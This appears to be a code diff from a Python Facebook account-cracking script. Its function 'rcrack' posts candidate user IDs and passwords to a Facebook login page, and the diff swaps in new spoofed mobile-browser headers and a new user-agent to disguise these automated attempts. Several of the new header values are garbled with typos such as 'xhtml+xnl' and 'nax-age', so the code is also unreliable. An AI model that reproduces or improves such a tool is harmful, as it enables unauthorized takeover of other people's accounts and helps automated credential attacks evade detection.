@@ -172,18 +172,30 @@ def rcrack(uid,pwx,tl):
             "login":"Log In"}
             header_freefb = {'authority':'free.facebook.com',
             'method': 'GET',
+
             'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9,en;q=0.8,en;q=0.7',
-            'cache-control': 'max-age=0',
-            'sec-ch-ua': '" Not A;Brand";v="8", "Chromium";v="105"',
-            'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
+
+            'accept': 'text/html, application/xhtml+xnl, application/xml ;q=0.9,image/avif, image/webp, inage/apng , */*; q=0.8, application/signed-exchange;v=b3;q=0.9',
+
+            'accept-encoding':'gzip, deflate, br','accept-language': 'en-US, en;q=0.9',
+
+            'cache-control': 'nax-age=0',
+
+            'sec-ch-ua': '" Chromium"; v="105", "Not) A; Brand";v="8*"',
+
+            'sec-ch-ua-mobile': '21','sec-ch-ua-platform': '"Android"',
+
             'sec-fetch-dest': 'document',
+
             'sec-fetch-mode': 'navigate',
+
             'sec-fetch-site': 'none',
+
             'sec-fetch-user': '?1',
+
             'upgrade-insecure-requests': '1',
-             'user-agent':'Mozilla/5.0 (Linux; Android 12; 22101316C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36',}
+
+             'user-agent':'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48 .0 KAIOS/2.5',}
             lo = session.get('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
